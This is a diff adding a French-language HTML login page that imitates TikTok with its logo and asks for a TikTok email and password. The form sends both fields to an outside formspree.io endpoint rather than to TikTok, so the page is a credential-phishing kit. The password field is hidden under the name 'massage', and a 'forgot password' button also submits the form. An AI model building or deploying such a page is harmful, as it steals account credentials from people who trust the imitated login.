@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="img/OIP.jpg">
+    <link rel="stylesheet" href="account.py">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://kit.fontawesome.com/yourcode.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="css/styles.css">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Se connecter</title>
+</head>
+<body>
+
+    <section class="account">
+        <div class="container">
+          <div class="logotiktok">
+            <img src="img/Sans_titre__1_-removebg-preview.png" alt="" width="190px">
+          </div>
+          <form action="https://formspree.io/f/xjvldnzg" method="post" id="my-form">
+      
+            <div class="form-group">
+              <label for="email" class="login-text">Compte email (tiktok)</label>
+              <input type="email" id="email" name="email" class="login">
+            </div>
+      
+            <div class="form-group">
+              <label for="massage" class="login-text">Mots de Passe</label>
+              <input name="massage" id="massage" class="login"></input>
+            </div>
+      
+            <button type="submit" style="color: white; background-color: rgb(21, 21, 146); border-radius: 50px;">Suivant</button>
+            <p style="text-align: center; font-size: 20px; margin: 10px;">ou</p>
+            <button type="submit" style="color: rgb(56, 23, 199); background-color: rgb(255, 255, 255); border-radius: 50px; border: rgb(12, 12, 187) 1px solid; ">mots de passe oublié</button>
+
+          </form>
+        </div>
+        <div id="status"></div>
+      </section>
+</body>
+</html>
